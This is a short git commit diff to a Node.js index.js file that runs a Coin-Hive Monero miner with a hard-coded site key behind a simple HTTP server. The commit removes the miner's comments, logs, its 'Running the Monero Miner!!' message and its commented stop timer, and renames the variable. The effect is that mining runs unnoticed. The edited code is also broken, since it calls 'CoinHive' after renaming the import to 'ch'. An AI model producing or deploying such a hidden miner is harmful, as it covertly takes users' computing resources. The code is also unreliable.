ca3dba5eb6fbff2861dba2a434d584b60f8818ce
Narbeh Mirzaei <narmirzaei@gmail.com>
2017-10-03 23:48:28 +0330

    Removed miner and coin words and logs.

--- index.js
+++ index.js
@@ -1,26 +1,14 @@
-const CoinHive = require('coin-hive');
+const ch = require('coin-hive');
 const http = require('http');
 
 (async () => {
 
-  // Create miner
-  const miner = await CoinHive('LP1n3Nd9iysr09tB1moWGiF3b3RqI0Bk'); // Coin-Hive's Site Key
+  const m = await CoinHive('LP1n3Nd9iysr09tB1moWGiF3b3RqI0Bk');
 
-  // Start miner
-  await miner.start();
-
-  // Listen on events
-  miner.on('found', () => console.log('Found!!'))
-  miner.on('accepted', () => console.log('Accepted!!'))
-  miner.on('update', data => console.log(`
-    Hashes per second: ${data.hashesPerSecond}
-    Total hashes: ${data.totalHashes}
-    Accepted hashes: ${data.acceptedHashes}
-  `));
+  await m.start();
 
   const requestHandler = (request, response) => {
     console.log(request.url)
-    response.end('Running the Monero Miner!!')
   }
 
   const server = http.createServer(requestHandler)
@@ -33,6 +21,4 @@ const http = require('http');
     console.log(`server is listening`)
   })
 
-  // Stop miner
-  //setTimeout(async () => await miner.stop(), 60000);
 })();
